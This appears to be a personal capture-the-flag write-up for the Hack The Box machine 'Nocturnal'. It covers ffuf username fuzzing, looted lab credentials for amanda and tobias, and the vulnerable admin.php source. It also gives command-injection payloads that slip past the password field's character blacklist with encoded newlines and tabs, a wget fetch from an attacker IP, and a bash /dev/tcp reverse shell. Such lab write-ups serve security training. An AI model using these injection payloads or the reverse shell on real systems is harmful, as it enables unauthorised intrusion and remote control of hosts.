# Nocturnal \[Linux Easy]

## Report

{% embed url="https://mux1337.gitbook.io/write-up-_/hack-the-box/machines/nocturnal" %}

{% embed url="https://1-cn--sec-com.translate.goog/archives/3984348.html?_x_tr_enc=1&_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc" %}

An authenticated file uploader interface is fuzzed to see all available files for download uploaded by users on the platform to find admin creds under alias amanda. Admin then has the capability to perform backups of all files in a particular directory with a user input password. This field is an attack vector and is compromised to produce a reverse shell, retrieve the SQLite database and get creds for tobias.

netstat shows HTTP instance of ISPConfig running on port 8080 which is vulnerable to authenticated RCE. Default username being admin, tobias' password works here, execute script and become root

## Cheatsheet

```
#Site checks user first and only then if file exists or not, if user exist it show all available files from that user
ffuf - u "http://nocturnal.htb/view.php?username=FUZZ&file=2.docx" -H "Cookie: PHPSESSID=$random" -w $wordlist -fs $value

#Tab and newline worked URL encode but not space
#example failed payload
bash%20-c%20%22bash%201.sh%22
#Quotes was also not URL encoded
password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
password=%0abash%09-c%09"bash%091.sh"%0a&backup=

#1.sh
bash -i >& /dev/tcp/10.10.16.48/8888 0>&1
```

## Loot

### Creds&#x20;

```
amanda:arHkG7HAI68X8s1J
tobias:slowmotionapocalypse
```

### Proof

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption><p>fuzzing to see valid usernames we can download files from</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption><p>function filtering password payload</p></figcaption></figure>

```
password=%0abash%09-c%09
```

why is the %0a (new line url encoded) needed and why call bash&#x20;

the line haveing $command may help you understand

<div align="left"><figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption><p>executing a command within a variable</p></figcaption></figure></div>

```php
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            color: #ff8c00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #2c2c2c;
            width: 90%;
            max-width: 1000px;
            padding: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
            border-radius: 12px;
        }

        h1, h2 {
            color: #ff8c00;
            font-weight: 600;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }

        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #555;
            border-radius: 8px;
            width: 100%;
            background-color: #333;
            color: #ff8c00;
        }

        button {
            padding: 12px;
            font-size: 16px;
            background-color: #2d72bc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #245a9e;
        }

        .file-list {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            background-color: #444;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }

        .file-list li.folder {
            background-color: #3b3b3b;
        }

        .file-list li.file {
            background-color: #4d4d4d;
        }

        .file-list li a {
            color: #ff8c00;
            text-decoration: none;
            margin-left: 10px;
        }

        .file-list li a:hover {
            text-decoration: underline;
        }

        pre {
            background-color: #2d2d2d;
            color: #eee;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            background-color: #e7f5e6;
            color: #2d7b40;
            font-weight: 500;
        }

        .error {
            background-color: #f8d7da;
            color: #842029;
        }

        .backup-output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: #ff8c00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Admin Panel</h1>

        <h2>File Structure (PHP Files Only)</h2>
        <?php listPhpFiles(__DIR__); ?>

        <h2>View File Content</h2>
        <?php if (isset($content)) { ?>
            <pre><?php echo $content; ?></pre>
        <?php } ?>

        <h2>Create Backup</h2>
        <form method="POST">
            <label for="password">Enter Password to Protect Backup:</label>
            <input type="password" name="password" required placeholder="Enter backup password">
            <button type="submit" name="backup">Create Backup</button>
        </form>

        <div class="backup-output">

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```

## In-Game Pitch Notes

File upload standard is put a reverse shell bypassing whitelist filters, however it is not being executed, just downloaded to local and opening from there

For backup password we are able to write whatever we want, try executing some commands

## Lessons Learnt

* Recycle creds, you never know - always a far shot but worth trying
* Payloads go crazy istg
* Good job clocking the file upload attack vector - no reverse shell or any of the funny stuff but still need to be faster
